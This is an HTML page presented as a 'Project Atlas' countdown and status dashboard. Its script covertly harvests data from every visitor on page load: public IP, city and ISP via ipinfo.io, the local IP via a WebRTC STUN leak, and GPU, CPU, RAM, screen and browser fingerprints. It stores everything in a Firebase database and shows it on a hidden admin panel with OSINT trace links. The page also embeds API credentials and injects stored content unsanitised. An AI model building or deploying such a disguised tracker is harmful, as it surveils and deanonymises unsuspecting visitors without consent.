<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>ErrahWorld | OSINT Uplink</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@400;600&display=swap');
        
        :root {
            --bg: #05070a; --panel: rgba(15, 20, 30, 0.95);
            --accent: #6366f1; --text: #f8fafc; --text-dim: #64748b;
            --border: rgba(255, 255, 255, 0.08); --danger: #ef4444;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding: 40px 20px; }
        .container { width: 100%; max-width: 900px; margin: auto; }
        
        .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; padding: 30px; margin-bottom: 25px; backdrop-filter: blur(10px); }
        #timer { font-family: 'JetBrains Mono'; font-size: 2.5rem; color: var(--accent); text-align: center; font-weight: 700; }

        .table-container { overflow-x: auto; border-radius: 15px; border: 1px solid var(--border); background: rgba(0,0,0,0.4); }
        table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
        th { color: var(--accent); padding: 15px; font-family: 'JetBrains Mono'; text-transform: uppercase; font-size: 0.7rem; border-bottom: 1px solid var(--border); }
        td { padding: 15px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.02); color: var(--text-dim); }

        #trafficSection { display: none; margin-top: 50px; }
        .log-row { cursor: pointer; transition: 0.2s; }
        .log-row:hover { background: rgba(99, 102, 241, 0.1); }
        
        /* Floating Controls */
        #adminToggle { position: fixed; bottom: 20px; right: 20px; background: var(--panel); border: 1px solid var(--border); color: var(--text-dim); padding: 10px 20px; border-radius: 30px; cursor: pointer; font-size: 0.75rem; font-weight: 600; }
        #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .modal-content { background: #0f172a; border: 1px solid var(--border); padding: 30px; border-radius: 20px; width: 320px; display: flex; flex-direction: column; gap: 15px; }
        .modal-content input { background: #000; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 10px; outline: none; }
        .modal-content button { background: var(--accent); color: #fff; border: none; padding: 12px; border-radius: 10px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <h1 style="text-align:center; font-weight:900; letter-spacing:-2px; margin-bottom:30px;">PROJECT ATLAS</h1>
        <div id="desc" class="panel" style="text-align:center;">Analyzing Signal...</div>
        
        <div class="panel">
            <div id="timer">00D 00H 00M 00S</div>
        </div>

        <div class="table-container">
            <table>
                <thead><tr><th>Node</th><th>Load</th><th>Status</th></tr></thead>
                <tbody id="tbody"></tbody>
            </table>
        </div>

        <div id="trafficSection">
            <h2 style="font-family:'JetBrains Mono'; color:var(--accent); font-size:0.8rem; margin-bottom:15px;">OSINT TRAFFIC LOGS</h2>
            <div class="table-container">
                <table>
                    <thead><tr><th>Timestamp</th><th>Signal Origin</th><th>Local Hop</th><th>Manage</th></tr></thead>
                    <tbody id="trafficBody" style="font-family:'JetBrains Mono'; font-size:11px;"></tbody>
                </table>
            </div>
        </div>
    </div>

    <button id="adminToggle">Admin Access</button>
    <button id="logoutBtn" style="display:none; position:fixed; bottom:20px; right:20px; background:var(--danger); color:#fff; border:none; padding:10px 20px; border-radius:30px; font-size:0.75rem; z-index:1001; cursor:pointer;">Logout</button>

    <div id="loginModal">
        <div class="modal-content">
            <input id="email" placeholder="Admin ID">
            <input id="password" type="password" placeholder="Keyphrase">
            <button id="loginBtn">Authorize</button>
            <p onclick="document.getElementById('loginModal').style.display='none'" style="text-align:center; color:var(--text-dim); cursor:pointer; font-size:11px;">CLOSE</p>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBoePuKarSCVgvxQQBGvkMKq16DvKmBYBE",
            authDomain: "strenght-a9f37.firebaseapp.com",
            databaseURL: "https://strenght-a9f37-default-rtdb.firebaseio.com",
            projectId: "strenght-a9f37"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();

        // Passive Signal Capture
        async function captureUplink() {
            try {
                const res = await fetch(`https://ipinfo.io/json?token=513ac66672e1f9`);
                const data = await res.json();
                
                const snap = await db.ref("visits").orderByChild("ip").equalTo(data.ip).once("value");
                if (!snap.exists()) {
                    let localIP = "Hidden";
                    const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (e) => {
                        if (e && e.candidate) {
                            const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (m) localIP = m[1];
                        }
                    };

                    setTimeout(() => {
                        db.ref("visits").push({
                            ip: data.ip, local_ip: localIP,
                            city: data.city, isp: data.org,
                            cpu: navigator.hardwareConcurrency, ram: navigator.deviceMemory,
                            gpu: getGPU(), res: `${screen.width}x${screen.height}`,
                            ua: navigator.userAgent, ts: Date.now(),
                            time: new Date().toLocaleString()
                        });
                    }, 1500);
                }
            } catch (e) {}
        }
        function getGPU() {
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch(e) { return "N/A"; }
        }
        captureUplink();

        // UI & Auth Logic
        auth.onAuthStateChanged(user => {
            const isAdmin = user && user.uid === 'Td0yoO3ygYZxbeMZjYtFAj9etA22';
            document.getElementById("trafficSection").style.display = isAdmin ? "block" : "none";
            document.getElementById("logoutBtn").style.display = isAdmin ? "block" : "none";
            document.getElementById("adminToggle").style.display = isAdmin ? "none" : "block";
            if (isAdmin) loadLogs();
        });

        function loadLogs() {
            db.ref("visits").orderByChild("ts").on("value", snap => {
                const tBody = document.getElementById("trafficBody");
                tBody.innerHTML = "";
                snap.forEach(child => {
                    const log = child.val();
                    const tr = document.createElement("tr");
                    tr.className = "log-row";
                    tr.innerHTML = `<td onclick="inspect('${child.key}')">${log.time}</td>
                        <td onclick="inspect('${child.key}')" style="color:var(--accent)">${log.ip}</td>
                        <td onclick="inspect('${child.key}')">${log.local_ip}</td>
                        <td><button onclick="db.ref('visits/${child.key}').remove()" style="color:var(--danger); background:none; border:none; cursor:pointer;">✖</button></td>`;
                    tBody.prepend(tr);
                });
            });
        }

        async function inspect(key) {
            const d = (await db.ref("visits/" + key).once("value")).val();
            const osintUrl = `https://criminalip.io/en/asset/report/${d.ip}`;
            
            let msg = `SIGNAL ANALYSIS:\nIP: ${d.ip}\nLOCAL: ${d.local_ip}\nISP: ${d.isp}\nCITY: ${d.city}\n----------------\nCORES: ${d.cpu} | RAM: ${d.ram}GB\nGPU: ${d.gpu}\n----------------\nACTION: Press OK to run OSINT Map Trace.`;
            
            if(confirm(msg)) {
                window.open(osintUrl, '_blank');
            }
        }

        document.getElementById('adminToggle').onclick = () => document.getElementById('loginModal').style.display = 'flex';
        document.getElementById('loginBtn').onclick = () => auth.signInWithEmailAndPassword(document.getElementById('email').value, document.getElementById('password').value).catch(() => alert("Access Denied"));
        document.getElementById('logoutBtn').onclick = () => auth.signOut();

        // Timer and Content Sync (Existing logic)
        db.ref("log").on("value", s => {
            const d = s.val() || {};
            document.getElementById("title").innerText = d.title || "Project Atlas";
            document.getElementById("desc").innerHTML = d.desc || "Active...";
            document.getElementById("tbody").innerHTML = d.table || "";
        });
        const target = new Date("February 3, 2026 00:00:00").getTime();
        setInterval(() => {
            const diff = target - Date.now();
            const d = Math.floor(diff/86400000), h = Math.floor((diff%86400000)/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
            document.getElementById("timer").textContent = `${d}D ${h}H ${m}M ${s}S`;
        }, 1000);
    </script>
</body>
</html>
